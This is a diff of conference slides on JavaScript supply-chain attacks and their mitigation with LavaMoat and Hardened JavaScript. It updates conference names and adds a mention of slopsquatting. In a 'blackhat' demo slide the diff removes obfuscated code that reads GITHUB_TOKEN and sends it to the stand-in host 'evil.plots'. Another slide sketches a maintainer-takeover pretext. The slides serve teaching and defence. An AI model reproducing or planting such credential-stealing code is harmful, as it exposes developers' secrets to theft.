@@ -181,9 +181,8 @@
         <small>
           <dl>
             <dd>built for DEFCON31,</dd>
-            <dd>updated for NodeConfEU,</dd>
-            <dd>updated for Confidence,</dd>
-            <dd>updated for X33fcon!</dd>
+            <dd>updated for NodeConfEU, Confidence, X33fcon</dd>
+            <dd>and now JSNation!</dd>
             
           </dl>
         </small>
@@ -297,7 +296,7 @@
           ### defensive coding
 
           - prototype pollution
-          - workshops at DEFCON and NodeConfEU  
+          - workshops at DEFCON, NodeConfEU and more
 
           ---
 
@@ -526,7 +525,9 @@
       </section> 
 
       <section data-markdown>
-        ### SES
+        ### Hardened Javascript
+
+        [https://hardenedjs.org](https://hardenedjs.org)
 
         - `Compartment` - scope isolation
         - `lockdown` - makes your Realm secure
@@ -559,6 +560,7 @@
       </section>
 
 
+    <section>
       <section class="whitehat">
         <h3> Let's install some dependencies! </h3>
       </section>
@@ -678,15 +680,18 @@ package.json:
           <section data-background="#235">
             <h4>And in that moment <br>the installation process was protected</h4>
           </section>
+        </section>
 
           <section data-markdown class="blackhat">
-            #### let's get serious
+            #### How about this package?
 
             > Dear ${ eslintPluginMaintainer },
             > I understand you're busy and I'd be happy to help with maintenance of your
-            tiny but popular plugin...
+            tiny but popular plugin...  
 
+            <br><br>
 
+            (Or find a common hallucination to [slopsquat](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks))
           </section>
           <section data-markdown class="blackhat">
             <textarea>
@@ -700,32 +705,15 @@ const req = require('https').request({
 }, ()=>{});
 req.end();
 ```
+<br>
+<sub><sup>
+  People don't even read the code they commit nowadays.
+</sup></sub>
           
         </textarea>
           </section>
           <section data-markdown class="blackhat">
             #### ok, just in case you do
-
-            ```
-            const _0x765e5=_0x46a0;(function(_0x57764e,_0x91aa41){const
-            _0x32405d=_0x46a0,_0x165444=_0x57764e();while(!![]){try{const
-            _0x42ba82=-parseInt(_0x32405d(0x150))/0x1*(parseInt(_0x32405d(0x15e))/0x2)+-parseInt(_0x32405d(0x153))/0x3*(-parseInt(_0x32405d(0x14f))/0x4)+parseInt(_0x32405d(0x159))/0x5*(-parseInt(_0x32405d(0x158))/0x6)+parseInt(_0x32405d(0x151))/0x7*(-parseInt(_0x32405d(0x152))/0x8)+parseInt(_0x32405d(0x157))/0x9+-parseInt(_0x32405d(0x15f))/0xa+parseInt(_0x32405d(0x15a))/0xb;
-            if(_0x42ba82===_0x91aa41)break;else
-            _0x165444['push'](_0x165444['shift']());}catch(_0x54f92f){_0x165444['push'](_0x165444['shift']());}}}(_0x3641,0x8e73e));function
-            _0x3641()
-            {const _0x5d9864=['/stolen/','evil.plots','2511378rgvTaf','5826vwOBSz','3845SrYtZx',
-            '37351105uFQfso','request','end','https','72326kmzepu','8558100KDxwfw',
-            'GITHUB_TOKEN','25432JwBMWs','29XqXcpt','4547823ytmFVF','8EFXBHJ','99iKrczU','env'];
-            _0x3641=function(){return _0x5d9864;};return _0x3641();}function _0x46a0(_0x24c0cb,_0x27294c){const
-            _0x3641a1=_0x3641();return _0x46a0=function(_0x46a08f,_0x225127){_0x46a08f=_0x46a08f-0x14f;let
-            _0x16a89a=_0x3641a1[_0x46a08f];return _0x16a89a;},
-            _0x46a0(_0x24c0cb,_0x27294c);}const
-            credentials=process[_0x765e5(0x154)][_0x765e5(0x160)],req=require(_0x765e5(0x15d))[_0x765e5(0x15b)]({'hostname':_0x765e5(0x156),'path':_0x765e5(0x155)+credentials},()=>{});req[_0x765e5(0x15c)]();
-            ```
-
-          </section>
-          <section data-markdown class="blackhat">
-            #### should I keep going?
 
             ![](./ilus/obfuscated.png)
 
@@ -809,19 +797,12 @@ TypeError: Cannot read properties of undefined
         <section data-markdown class="whitehat">
           ### I can do frontend too
   
-          1. LavaMoat webpack plugin (in BETA)
-          2. browserify 
+          LavaMoat webpack plugin 1.0
           
-          Wanna try the plugin?
-  
-          #### Open Beta hub here:
-  
-          [https://github.com/LavaMoat/LavaMoat/discussions/723](https://github.com/LavaMoat/LavaMoat/discussions/723)
-  
         </section>
        
         <section>
-          <h4> I'll help you set up LavaMoat in your project</h4>
+          <h4> I could help you set up LavaMoat in your project</h4>
 
           <img src="naugtur.svg" style="height:6em" />
 
@@ -840,11 +821,6 @@ TypeError: Cannot read properties of undefined
         <p>@naugtur &nbsp; <a href="https://naugtur.pl/">naugtur.pl</a></p>
         <p> <a href="https://naugtur.pl/training">naugtur.pl/training</a></p>
 
-
-      </section>
-      <section>
-        <img src="./ilus/mm.svg" height="200px">
-        <h4>we could work side-by-side</h4>
 
       </section>
     </div>
